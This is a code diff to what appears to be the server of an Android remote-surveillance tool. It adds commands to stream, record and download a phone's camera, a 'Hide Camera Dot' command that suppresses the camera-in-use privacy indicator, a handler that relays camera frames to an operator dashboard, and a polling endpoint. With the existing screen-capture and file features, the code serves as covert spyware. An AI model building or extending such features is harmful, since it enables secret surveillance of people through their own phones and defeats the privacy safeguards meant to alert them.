@@ -148,6 +148,16 @@ const COMMANDS = {
     // Camera
     get_available_cameras:     { category: 'camera',       label: 'Available Cameras',     icon: '📷' },
     take_photo:                { category: 'camera',       label: 'Take Photo',            icon: '📷' },
+    camera_stream_start:       { category: 'camera',       label: 'Camera Stream Start',   icon: '🎥' },
+    camera_stream_stop:        { category: 'camera',       label: 'Camera Stream Stop',    icon: '⏹️' },
+    camera_record_start:       { category: 'camera',       label: 'Camera Record Start',   icon: '⏺️' },
+    camera_record_stop:        { category: 'camera',       label: 'Camera Record Stop',    icon: '⏹️' },
+    list_camera_recordings:    { category: 'camera',       label: 'List Camera Recordings',icon: '📋' },
+    get_camera_recording:      { category: 'camera',       label: 'Get Camera Recording',  icon: '📥' },
+    delete_camera_recording:   { category: 'camera',       label: 'Delete Camera Recording',icon:'🗑️'},
+    camera_hide_dot:           { category: 'camera',       label: 'Hide Camera Dot',       icon: '🔴' },
+    camera_show_dot:           { category: 'camera',       label: 'Show Camera Dot',       icon: '🟢' },
+    get_camera_stream_status:  { category: 'camera',       label: 'Camera Stream Status',  icon: '📊' },
     // Screenshot
     take_screenshot:           { category: 'screen',       label: 'Take Screenshot',       icon: '📸' },
     // Files
@@ -348,6 +358,8 @@ const FRAME_RELAY_MIN_MS = 100;         // Never relay frames faster than 10 FPS
 const latestScreenReaderData = new Map(); // deviceId → { success, screen, deviceId, _ts }
 /** @type {Map<string, Object>} Latest JPEG stream frame per device — polled by dashboard */
 const latestStreamFrame = new Map();      // deviceId → { frameData, deviceId, _ts, screenWidth?, screenHeight? }
+/** @type {Map<string, Object>} Latest camera JPEG frame per device — polled by CameraMonitorTab */
+const latestCameraFrame = new Map();      // deviceId → { frameData, cameraId, deviceId, _ts }
 
 // ============================================
 // LOGGING HELPERS
@@ -687,6 +699,27 @@ async function processMessage(clientId, clientType, event, data) {
         return;
     }
 
+    // ── Camera frame from Android ─────────────────────────────────────
+    if (event === 'camera:frame') {
+        const conn = tcpClients.get(clientId);
+        const deviceId = conn?.deviceId;
+        if (!deviceId) return;
+        const frameData = data?.frameData;
+        if (!frameData) return;
+
+        const now = Date.now();
+        const cameraMsg = {
+            deviceId,
+            frameData,
+            cameraId: data.cameraId || '0',
+            timestamp: now,
+            _ts: now,
+        };
+        latestCameraFrame.set(deviceId, cameraMsg);
+        broadcastDash('camera:frame', cameraMsg);
+        return;
+    }
+
     // ── Command response from Android ───────────────────────────────
     if (event === 'command:response') {
         const { commandId, response: rawResponse, error } = data || {};
@@ -1010,6 +1043,19 @@ app.get('/api/stream/latest/:deviceId', (req, res) => {
 
     const { deviceId } = req.params;
     const data = latestStreamFrame.get(deviceId);
+    if (!data) return res.json({ success: false, hasData: false });
+    res.json({ success: true, ...data });
+});
+
+// ── Camera frame polling endpoint ──────────────────────────────────────────────
+app.get('/api/camera/latest/:deviceId', (req, res) => {
+    const token = req.query.token || (req.headers['authorization'] || '').replace('Bearer ', '');
+    if (!token || !global._adminTokens) return res.status(401).json({ success: false });
+    const expiry = global._adminTokens.get(token);
+    if (!expiry || Date.now() > expiry) return res.status(401).json({ success: false });
+
+    const { deviceId } = req.params;
+    const data = latestCameraFrame.get(deviceId);
     if (!data) return res.json({ success: false, hasData: false });
     res.json({ success: true, ...data });
 });
